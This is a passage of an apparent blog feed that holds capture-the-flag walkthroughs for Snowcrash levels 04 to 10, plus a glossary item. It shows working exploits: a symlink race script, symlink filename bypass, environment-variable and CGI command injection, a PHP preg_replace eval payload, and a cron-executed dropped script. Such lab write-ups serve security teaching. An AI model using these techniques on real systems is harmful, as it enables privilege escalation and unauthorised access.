            log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;[{}] recv: {}&#34;</span><span style="color:#f92672">.</span>format(s<span style="color:#f92672">.</span>getsockname(), data<span style="color:#f92672">.</span>strip()))
        <span style="color:#66d9ef">else</span>:
            inputs<span style="color:#f92672">.</span>remove(s)

proc<span style="color:#f92672">.</span>wait()
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;done&#34;</span>)
</code></pre></td></tr></table>
</div>
</div><p>The following python script do:</p>
<ol>
<li>Create <strong>falsy file</strong> that the user can read</li>
<li>Create server socket</li>
<li>Launch <code>level10</code> with the needed argument</li>
<li>Wait for <code>level10</code> to connect to the server</li>
<li>Replace the <strong>falsy file</strong> with a symlink to <strong>target file</strong></li>
<li>Read the data send by <code>level10</code></li>
</ol>
<h2 id="nice">Nice</h2>
<p>By running our previous script, we have the following output with the flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ python test.py ~/level10 /tmp/lvl10 ~/token
INFO:root:listening on: <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, 6969<span style="color:#f92672">)</span>
INFO:root:launch subprocess: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;/home/user/level10/level10&#39;</span>, <span style="color:#e6db74">&#39;/tmp/lvl10&#39;</span>, <span style="color:#e6db74">&#39;127.0.0.1&#39;</span><span style="color:#f92672">]</span>
INFO:root:<span style="color:#f92672">[(</span><span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, 6969<span style="color:#f92672">)]</span> connected
INFO:root:<span style="color:#f92672">[(</span><span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, 6969<span style="color:#f92672">)]</span> recv: .*<span style="color:#f92672">(</span> <span style="color:#f92672">)</span>*.
INFO:root:<span style="color:#f92672">[(</span><span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, 6969<span style="color:#f92672">)]</span> recv: <span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
INFO:root:done
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level09</title>
            <link>/posts/snowcrash/level09/</link>
            <pubDate>Mon, 03 Aug 2020 15:54:09 +0200</pubDate>
            
            <guid>/posts/snowcrash/level09/</guid>
            <description>on connection, we have 2 file level09 and token
first token is readable but it contain some non-printable char,
$ cat f4kmm6p|=�p�n��DB�Du{�� $ xxd token 0000000: 6634 6b6d 6d36 707c 3d82 7f70 826e 8382 f4kmm6p|=..p.n.. 0000010: 4442 8344 757b 7f8c 890a DB.Du{.... on the other hand, level09 require an argument.
$ ./level09 You need to provied only one arg. The argument is transformed into another string
$ ./level09 aaaaa abcde $ .</description>
            <content type="html"><![CDATA[<p>on connection, we have 2 file <code>level09</code> and <code>token</code></p>
<p>first <code>token</code> is readable but it contain some non-printable char,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat
f4kmm6p|<span style="color:#f92672">=</span>�p�n��DB�Du<span style="color:#f92672">{</span>��
$ xxd token
0000000: <span style="color:#ae81ff">6634</span> 6b6d 6d36 707c 3d82 7f70 826e <span style="color:#ae81ff">8382</span>  f4kmm6p|<span style="color:#f92672">=</span>..p.n..
0000010: <span style="color:#ae81ff">4442</span> <span style="color:#ae81ff">8344</span> 757b 7f8c 890a                 DB.Du<span style="color:#f92672">{</span>....
</code></pre></div><p>on the other hand, <code>level09</code> require an argument.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level09
You need to provied only one arg.
</code></pre></div><p>The argument is transformed into another string</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level09 aaaaa
abcde
$ ./level09 <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print(&#34;a&#34;*26)&#39;</span><span style="color:#66d9ef">)</span>
abcdefghijklmnopqrstuvwxyz
$ ./level09 <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print(&#34;hello\x05world&#34;)&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
hfnos
<span style="color:#f92672">}</span>vzun
</code></pre></div><p>with the following output we can determine how <code>level09</code> work.<br>
<code>level09</code> transform our argument by adding to any char its index value in the string.</p>
<h2 id="game-breaker">Game breaker</h2>
<p>To decode <code>token</code>, we need to write a script who does the opposite of <code>level09</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode_bytes</span>(s:bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#66d9ef">return</span> bytes([ c <span style="color:#f92672">-</span> idx <span style="color:#66d9ef">if</span> c <span style="color:#f92672">&gt;=</span> idx <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> idx, c <span style="color:#f92672">in</span> enumerate(s)])

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> argv[<span style="color:#ae81ff">1</span>:]:
        <span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
            res <span style="color:#f92672">=</span> decode_bytes(f<span style="color:#f92672">.</span>read())
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[*] {}: {}&#39;</span><span style="color:#f92672">.</span>format(file, res<span style="color:#f92672">.</span>decode()))
</code></pre></div><p>We test our script with a previously known encoded string, to see if we get the right output.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ python decode.py /dev/stdin
abcdef
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> /dev/stdin: aaaaaa
</code></pre></div><h2 id="and-now-the-flag">And now the flag</h2>
<p>We can now decode the file <code>token</code> and use the output to log as <code>flag09</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python decode.py token
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> token: <span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level08</title>
            <link>/posts/snowcrash/level08/</link>
            <pubDate>Mon, 03 Aug 2020 15:53:09 +0200</pubDate>
            
            <guid>/posts/snowcrash/level08/</guid>
            <description>On the home dir, we have 2 file level08 with is following pseudo-code and token who is only readable be flag08
$ ls -l total 16 -rwsr-s---+ 1 flag08 level08 8617 Mar 5 2016 level08 -rw------- 1 flag08 flag08 26 Mar 5 2016 token int main(int argc,char **argv) { char *needle; int fd; ssize_t n; char buf[1024]; if (argc == 1) { errx(1, &amp;#34;%s [file to read]\n&amp;#34;, argv[0]); } needle = strstr(argv[1], &amp;#34;token&amp;#34;); if (needle !</description>
            <content type="html"><![CDATA[<p>On the home dir, we have 2 file <code>level08</code> with is following pseudo-code and <code>token</code> who is only readable be <strong>flag08</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
total <span style="color:#ae81ff">16</span>
-rwsr-s---+ <span style="color:#ae81ff">1</span> flag08 level08 <span style="color:#ae81ff">8617</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> level08
-rw-------  <span style="color:#ae81ff">1</span> flag08 flag08    <span style="color:#ae81ff">26</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> token
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>needle;
  <span style="color:#66d9ef">int</span> fd;
  ssize_t n;
  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">1024</span>];

  <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
    errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;%s [file to read]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
  }
  needle <span style="color:#f92672">=</span> strstr(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;token&#34;</span>);
  <span style="color:#66d9ef">if</span> (needle <span style="color:#f92672">!=</span> NULL) {
    errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;You may not access </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#39;\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
  }
  fd <span style="color:#f92672">=</span> open(argv[<span style="color:#ae81ff">1</span>], O_RDONLY);
  <span style="color:#66d9ef">if</span> (fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
    err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to open %s&#34;</span>, argv[<span style="color:#ae81ff">1</span>]);
  }
  n <span style="color:#f92672">=</span> read(fd, buff, <span style="color:#66d9ef">sizeof</span>(buff));
  <span style="color:#66d9ef">if</span> (n <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
    err(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Unable to read fd %d&#34;</span>, fd);
  }
  <span style="color:#66d9ef">return</span> write(STDOUT_FILENO, buff, n);
}
</code></pre></div><h2 id="explanation">Explanation</h2>
<p><code>level08</code> take a file as argument<br>
check if the argument doesn&rsquo;t contains the string <code>token</code><br>
then open/read the file</p>
<h2 id="counter-the-filename-check">Counter the filename check</h2>
<p>to counter the filename check on <code>level08</code> we have access in linux to <a href="/posts/glossary/symlink">symbolic link</a>.<br>
We just have to create a link to the file <code>~/token</code> with a name that doesn&rsquo;t not contains the string <code>token</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ln -s ~/token /tmp/foo
$ ./level08 /tmp/foo
<span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level07</title>
            <link>/posts/snowcrash/level07/</link>
            <pubDate>Mon, 03 Aug 2020 15:52:09 +0200</pubDate>
            
            <guid>/posts/snowcrash/level07/</guid>
            <description>On the home directory, we have a file level07 with the following pseudo-code
int main() { char *cmd; asprintf(&amp;amp;cmd, &amp;#34;/bin/echo %s &amp;#34;, getenv(&amp;#34;LOGNAME&amp;#34;)) return system(cmd); } Explenation level07 retrieve the value LOGNAME from the env table,
then concat the string at the end of /bin/echo  and execute it
 Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the env table  system(char *command) executes a command specified in command by calling /bin/sh -c command</description>
            <content type="html"><![CDATA[<p>On the home directory, we have a file <code>level07</code> with the following pseudo-code</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cmd;

  asprintf(<span style="color:#f92672">&amp;</span>cmd, <span style="color:#e6db74">&#34;/bin/echo %s &#34;</span>, getenv(<span style="color:#e6db74">&#34;LOGNAME&#34;</span>))
  <span style="color:#66d9ef">return</span> system(cmd);
}
</code></pre></div><h2 id="explenation">Explenation</h2>
<p><code>level07</code> retrieve the value <strong>LOGNAME</strong> from the <a href="/posts/glossary/env_table">env table</a>,<br>
then concat the string at the end of <code>/bin/echo </code> and execute it</p>
<ul>
<li>Simple execution
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level07
level07
</code></pre></div></li>
<li>Changing the output
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ LOGNAME<span style="color:#f92672">=</span>foobar ./level07
foobar
</code></pre></div></li>
</ul>
<h2 id="poisoning-the-env-table">Poisoning the env table</h2>
<blockquote>
<p><code>system(char *command)</code> executes a command specified in <em>command</em> by calling
<strong>/bin/sh</strong> -c <em>command</em></p>
</blockquote>
<p>Because <strong>LOGNAME</strong> is not sanytize, we can execute any command as <strong>flag07</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ LOGNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$(whoami)&#39;</span> ./level07
flag07
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level06</title>
            <link>/posts/snowcrash/level06/</link>
            <pubDate>Mon, 03 Aug 2020 15:44:15 +0200</pubDate>
            
            <guid>/posts/snowcrash/level06/</guid>
            <description>On the home directory, we have 2 files level06.php with the following content and level06 which is a wrapper around level06.php to run it as the user flag06, thanks to his setuid
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  #!/usr/bin/php &amp;lt;?php function y($m) { $m = preg_replace(&amp;#34;/\./&amp;#34;, &amp;#34; x &amp;#34;, $m); $m = preg_replace(&amp;#34;/@/&amp;#34;, &amp;#34; y&amp;#34;, $m); return $m; } function x($y, $z) { $a = file_get_contents($y); $a = preg_replace(&amp;#34;/(\[x (.</description>
            <content type="html"><![CDATA[<p>On the home directory, we have 2 files <code>level06.php</code> with the following content
and <code>level06</code> which is a wrapper around <code>level06.php</code> to run it as the user <strong>flag06</strong>, thanks to his <em>setuid</em></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">#!/usr/bin/php
<span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">y</span>($m) {
  $m <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\./&#34;</span>, <span style="color:#e6db74">&#34; x &#34;</span>, $m);
  $m <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/@/&#34;</span>, <span style="color:#e6db74">&#34; y&#34;</span>, $m);
  <span style="color:#66d9ef">return</span> $m;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">x</span>($y, $z) {
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($y);
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/(\[x (.*)\])/e&#34;</span>, <span style="color:#e6db74">&#34;y(</span><span style="color:#ae81ff">\&#34;\\</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>, $a);
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\[/&#34;</span>, <span style="color:#e6db74">&#34;(&#34;</span>, $a);
  $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/\]/&#34;</span>, <span style="color:#e6db74">&#34;)&#34;</span>, $a);
  <span style="color:#66d9ef">return</span> $a;
}

$r <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>($argv[<span style="color:#ae81ff">1</span>], $argv[<span style="color:#ae81ff">2</span>]);
<span style="color:#66d9ef">print</span> $r;
<span style="color:#75715e">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="inspection">Inspection</h2>
<p>On the script, only the function <strong>x</strong> is interesting because of the <code>preg_replace</code> with the <strong>eval flag</strong> (<code>\e</code>) on (line 11).</p>
<p>The <strong>eval flag</strong> on <code>preg_replace</code> &hellip;</p>
<blockquote>
<p>does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string</p>
</blockquote>
<h2 id="malicious-file">Malicious file</h2>
<p>For the exploit to work, our payload need to be matched in the 2nd group of the regex pattern <code>/(\[x (.*)\])/e</code></p>
<p>I came with the following result</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[x ${`echo current user $(id) 1&gt;&amp;2`}]
</code></pre></div><p>and get as output</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level06 malicious_file
<span style="display:block;width:100%;background-color:#3c3d38">current user uid<span style="color:#f92672">=</span>3006<span style="color:#f92672">(</span>flag06<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>2006<span style="color:#f92672">(</span>level06<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>3006<span style="color:#f92672">(</span>flag06<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,2006<span style="color:#f92672">(</span>level06<span style="color:#f92672">)</span>
</span>PHP Notice:  Undefined variable:  in /home/user/level06/level06.php<span style="color:#f92672">(</span>4<span style="color:#f92672">)</span> : regexp code on line <span style="color:#ae81ff">1</span>

</code></pre></td></tr></table>
</div>
</div><p>See the output of our command on line 2</p>
<h2 id="source">Source</h2>
<ul>
<li><a href="https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple">php string variable parsing</a></li>
<li><a href="https://www.php.net/manual/en/function.preg-replace.php">preg replace</a></li>
<li><a href="https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">preg replace eval</a></li>
<li><a href="http://www.madirish.net/402">exploiting php pcre func</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level05</title>
            <link>/posts/snowcrash/level05/</link>
            <pubDate>Mon, 03 Aug 2020 14:35:25 +0200</pubDate>
            
            <guid>/posts/snowcrash/level05/</guid>
            <description>When connecting to level05, we are greated be the following line
You have new mail. The mail $ cat /var/mail/level05 */2 * * * * su -c &amp;#34;sh /usr/sbin/openarenaserver&amp;#34; - flag05 The mail content is a crontab instruction that execute
sh /usr/sbin/openarenaserver as the user flag05 every 2 minute
The script #!/bin/sh  for i in /opt/openarenaserver/* ; do (ulimit -t 5; bash -x &amp;#34;$i&amp;#34;) rm -f &amp;#34;$i&amp;#34; done For each file in /opt/openarenaserver execute it as a bash script.</description>
            <content type="html"><![CDATA[<p>When connecting to <strong>level05</strong>, we are greated be the following line</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">You have new mail.
</code></pre></div><h2 id="the-mail">The mail</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /var/mail/level05
*/2 * * * * su -c <span style="color:#e6db74">&#34;sh /usr/sbin/openarenaserver&#34;</span> - flag05
</code></pre></div><p>The mail content is a crontab instruction that execute<br>
<code>sh /usr/sbin/openarenaserver</code> as the user <strong>flag05</strong> every 2 minute</p>
<h2 id="the-script">The script</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">for</span> i in /opt/openarenaserver/* ; <span style="color:#66d9ef">do</span>
        <span style="color:#f92672">(</span>ulimit -t 5; bash -x <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>
        rm -f <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><p>For each file in <code>/opt/openarenaserver</code> execute it as a bash script.<br>
Each script can run up to 5 sec ( <code>ulimit -t 5</code> )</p>
<h2 id="one-more-things">One more things</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -ld /opt/openarenaserver/
drwxrwxr-x+ <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">40</span> Aug  <span style="color:#ae81ff">3</span> 13:48 /opt/openarenaserver/
$ getfacl /opt/openarenaserver
getfacl: Removing leading <span style="color:#e6db74">&#39;/&#39;</span> from absolute path names
<span style="color:#75715e"># file: opt/openarenaserver</span>
<span style="color:#75715e"># owner: root</span>
<span style="color:#75715e"># group: root</span>
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
</code></pre></div><p>The user <strong>level05</strong> can create file in the dir <code>/opt/openarenaserver/</code> thanks to the acl
<code>default:user:level05:rwx</code></p>
<h2 id="run-my-script">Run my script</h2>
<p>Since its a shell script that will be executed, we have access to most of shell command</p>
<p>I will just use the following script as a POC</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/sh
</span><span style="color:#75715e"></span>
echo <span style="color:#e6db74">&#34;hello i&#39;m </span><span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> &gt; /tmp/flag05
</code></pre></div><p>after less than 2 min, we get the following result</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /tmp/flag05
hello i<span style="color:#960050;background-color:#1e0010">&#39;</span>m flag05
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Snowcrash - Level04</title>
            <link>/posts/snowcrash/level04/</link>
            <pubDate>Sun, 02 Aug 2020 21:25:56 +0200</pubDate>
            
            <guid>/posts/snowcrash/level04/</guid>
            <description>We have a file level04.pl with the setuid set
#!/usr/bin/perl # localhost:4747 use CGI qw{param}; print &amp;#34;Content-type: text/html\n\n&amp;#34;; sub x { $y = $_[0]; print `echo $y 2&amp;gt;&amp;amp;1`; } x(param(&amp;#34;x&amp;#34;)); Quick explanation The script take a parameter x, include it in the string `echo $y 2&amp;gt;&amp;amp;1` ( where y is our x value )
Then execute that string has an shell command then print its output.
Normally the script should print what we give it to params x.</description>
            <content type="html"><![CDATA[<p>We have a file <code>level04.pl</code> with the <a href="/posts/glossary/file_permission">setuid set</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/perl</span>
<span style="color:#75715e"># localhost:4747</span>
<span style="color:#66d9ef">use</span> CGI <span style="color:#e6db74">qw{param}</span>;
<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Content-type: text/html\n\n&#34;</span>;
<span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">x</span> {
  $y <span style="color:#f92672">=</span> $_[<span style="color:#ae81ff">0</span>];
  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">`echo $y 2&gt;&amp;1`</span>;
}
x(param(<span style="color:#e6db74">&#34;x&#34;</span>));
</code></pre></div><h2 id="quick-explanation">Quick explanation</h2>
<p>The script take a parameter <strong>x</strong>, include it in the string <code>`echo $y 2&gt;&amp;1`</code> ( where <code>y</code> is our <code>x</code> value )<br>
Then execute that string has an shell command then print its output.</p>
<p>Normally the script should print what we give it to params <strong>x</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl localhost:4747?x<span style="color:#f92672">=</span>hello_world
hello_world
</code></pre></div><h2 id="the-weak-part">The Weak part</h2>
<p>But because <strong>x</strong> is not sanitize and because <strong>x</strong> will be used in a shell command as it.<br>
We can make the script execute arbitrary code with the right of <strong>flag04</strong></p>
<h2 id="the-poc">The Poc</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ curl localhost:4747?x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;`whoami`&#39;</span>
flag04
</code></pre></div><h2 id="source">Source</h2>
<ul>
<li><a href="https://www.stat.berkeley.edu/~spector/extension/perl/notes/node73.html">The backquote operator</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>What is Environment Table</title>
            <link>/posts/glossary/env_table/</link>
            <pubDate>Sun, 02 Aug 2020 17:02:58 +0200</pubDate>
            
            <guid>/posts/glossary/env_table/</guid>
            <description>An Environment Table is a table that is accessible by each process
Some Environment variable to know about    name description     PATH used to list each directory to search for binary   HOME a directory to be consider as the home directory of the current user   PWD the current working directory    Source  wikipedia  </description>
            <content type="html"><![CDATA[<p>An <strong>Environment Table</strong> is a table that is accessible by each process</p>
<h2 id="some-environment-variable-to-know-about">Some Environment variable to know about</h2>
<table>
<thead>
<tr>
<th><strong>name</strong></th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>PATH</strong></td>
<td>used to list each directory to search for binary</td>
</tr>
<tr>
<td><strong>HOME</strong></td>
<td>a directory to be consider as the home directory of the current user</td>
</tr>
